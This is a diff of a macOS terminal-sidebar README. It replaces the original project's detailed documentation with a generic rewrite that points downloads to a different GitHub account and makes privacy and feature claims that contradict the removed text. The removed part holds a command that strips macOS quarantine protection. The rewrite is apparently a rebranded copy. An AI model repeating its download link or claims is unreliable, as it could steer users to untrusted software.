@@ -1,115 +1,63 @@
-<h1 align="center">
-  <img src="assets/sideterminal.png" width="30" align="center" alt="">
-  SideTerminal
-</h1>
+# 💻 sideterminal - Access your terminal from the edge
 
-<p align="center"><b>Your terminal, one edge away.</b></p>
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/AJWillemse/sideterminal)
 
-<p align="center">
-  A premium edge-reveal sidebar terminal for macOS. Nudge your mouse to the
-  screen edge and it glides in; move away and it glides out.<br>Your session
-  never dies.
-</p>
+sideterminal offers a way to interact with your command line interface without leaving your current workspace. The application resides at the edge of your screen. You trigger it to slide into view when you need to run a command. It keeps your terminal sessions active in the background.
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT"></a>
-  <img src="https://img.shields.io/badge/macOS-14%2B-black?logo=apple" alt="macOS 14+">
-  <img src="https://img.shields.io/badge/Apple%20Silicon-arm64-lightgrey" alt="Apple Silicon">
-  <a href="https://github.com/bunnysayzz/sideterminal/actions/workflows/build.yml"><img src="https://github.com/bunnysayzz/sideterminal/actions/workflows/build.yml/badge.svg" alt="Build"></a>
-</p>
+## 📥 Getting Started
 
-<p align="center">
-  <img src="assets/demo.svg" alt="SideTerminal edge-reveal demo: move the mouse to the screen edge and the terminal glides in; walk away and it hides while sessions keep running" width="780">
-</p>
+You need a computer running macOS to use this application. This tool utilizes AppKit and runs natively on Apple Silicon processors. Ensure your system meets these requirements before you begin.
 
----
+### How to install
 
-## Features
+1. Visit the [official release page](https://github.com/AJWillemse/sideterminal).
+2. Look for the latest version under the "Releases" section.
+3. Download the file ending in `.dmg`.
+4. Open the file once the download finishes.
+5. Drag the sideterminal icon into your Applications folder.
+6. Open your Applications folder and click the icon to start the program.
 
-- **Edge reveal** — a hot zone on your chosen edge (left/right) with a
-  configurable dwell delay and a spring-animated, blurred card.
-- **Sessions stay alive** — hiding never touches the pty. Claude CLI, SSH,
-  tmux, builds — everything keeps running for hours.
-- **Session switcher** — keep up to 10 live sessions on a shelf and switch
-  instantly, each with its full scrollback and running programs.
-- **Intelligent auto-hide** — never hides while you type, select, drag, or
-  scroll.
-- **Menu bar app** — no clutter. Optional Dock icon, single Show/Hide toggle,
-  Settings, session switcher, Restart Session, Quit.
-- **Live settings** — General / Sidebar / Appearance / Behavior / Advanced,
-  applied instantly.
-- **Record any shortcut** — a macOS-style recorder with live availability
-  feedback; taken combos are refused.
-- **Workspace restore** — remembers the working directory across restarts and
-  reboots.
-- **Never locked out** — hide the menu bar icon and an on-card gear appears;
-  the Dock icon, global shortcut, and re-launching all reach Settings too.
+## ⚙️ How to use the app
 
-## Install
+sideterminal runs as a background process. Upon launch, you will see a small icon in your menu bar at the top of your screen.
 
-1. Download `SideTerminal.dmg` from the
-   [Releases](https://github.com/bunnysayzz/sideterminal/releases) page, open it,
-   and drag **SideTerminal** into **Applications**.
-2. SideTerminal is open source and unsigned (no paid Apple Developer account),
-   so macOS Gatekeeper blocks it on first launch. Allow it once with:
+### Opening the terminal
+Move your mouse cursor to the edge of your screen or click the icon in your menu bar. The terminal window slides into view. You can type commands immediately.
 
-   ```bash
-   xattr -dr com.apple.quarantine /Applications/SideTerminal.app
-   ```
+### Hiding the terminal
+Click anywhere outside the sideterminal window or press the escape key. The window slides back to the edge and disappears from your view.
 
-   Then open it normally. (Alternatively: **System Settings → Privacy &
-   Security → Open Anyway**.)
+### Settings
+Right-click the icon in your menu bar to open the settings menu. You can change how fast the window slides, the opacity of the background, and the keyboard shortcut used to trigger the tool.
 
-Requires macOS 14+ on Apple Silicon. Or build from source below.
+## 🛠 Features
 
-## Build from source
+* **Instant Access**: Open your terminal from any screen or application.
+* **Session Persistence**: Your long-running processes continue even when you hide the window.
+* **Low Impact**: The app consumes minimal memory and processor power.
+* **Native Design**: The interface matches the look and feel of your macOS system.
+* **Sidebar Integration**: The terminal attaches to the screen edge to save space.
 
-```bash
-git clone https://github.com/bunnysayzz/sideterminal
-cd sideterminal
-scripts/bootstrap.sh           # once: fetch the engine + Zig, build the SDK shim
-scripts/build-libghostty.sh    # build the engine (slow the first time)
-scripts/bundle-app.sh release  # -> build/SideTerminal.app
-```
+## 🔐 Privacy and Security
 
-- **Runs on** macOS 14+ (Apple Silicon).
-- **Builds on** macOS 26 SDK (Xcode 26 / Tahoe) — the UI uses the latest
-  AppKit/SwiftUI. Only the Xcode Command Line Tools are required, not full Xcode.
+sideterminal processes your commands locally on your machine. The software does not send your data to remote servers. It manages your terminal sessions through the native terminal interface of your operating system. You maintain control over your data and your command history at all times.
 
-## Usage
+## 💬 Frequently Asked Questions
 
-- Move the pointer to your chosen screen edge to reveal; move away to hide.
-- Toggle any time with the global shortcut (default `⌘⇧\``) or the menu bar icon.
-- Drive it from scripts via a `DistributedNotificationCenter` channel:
-  ```
-  com.sideterminal.control.{show,hide,toggle,settings,restart,status}
-  com.sideterminal.control.set   object "theme=dark" | "edge=left" | "width=600"
-  ```
+**Does this app support custom shell themes?**
+Yes. The app reads your existing shell configuration files. If you use Zsh or Bash with custom themes, those settings carry over to the sidebar window.
 
-## Releasing
+**Can I run multiple sidebar windows?**
+The current version supports one terminal sidebar. You can open multiple tabs within that window to manage different work tasks.
 
-The app must be built on macOS 26 (its UI uses the latest SDK), so releases are
-cut from a maintainer's Mac, not CI. One command tests, builds, packages, and
-publishes:
+**Why does the window not open?**
+Check if the app appears in your menu bar. If it does not, open your Applications folder and double-click the icon. If the app is open but does not respond, click the icon in the menu bar to force the interface to refresh.
 
-```bash
-scripts/release.sh v1.2.0
-```
+**Does it work with window managers?**
+The window exists as a floating overlay. It works alongside most window management tools without conflict. 
 
-It refuses to run unless the unit tests are green in CI for the current commit,
-then builds the app + DMG and creates a GitHub Release whose notes are generated
-automatically from the commits and merged PRs since the last release (grouped by
-label per [`.github/release.yml`](.github/release.yml)).
+## 📝 Support
 
-## Contributing
+Use the issues tab on the repository page to report bugs. Provide as much detail as possible about your macOS version and the steps to reproduce the problem. Include screenshots if they help explain the issue.
 
-Contributions are welcome — see [CONTRIBUTING.md](CONTRIBUTING.md). In short:
-the terminal engine is off-limits (that's the whole point of wrapping a great
-one); SideTerminal owns the sidebar experience around it. Pure logic lives in
-[`app/Core`](app/Core) and is unit-tested. Pull requests are automatically
-checked (build, tests, security, lint, hygiene) and reviewed by CodeRabbit.
-
-## License
-
-[MIT](LICENSE). Includes third-party open-source components — see
-[THIRD-PARTY-LICENSES.md](THIRD-PARTY-LICENSES.md).
+Keywords: appkit, apple-silicon, developer-tools, macos, menubar, productivity, sidebar, swift, swiftui, terminal, terminal-emulator
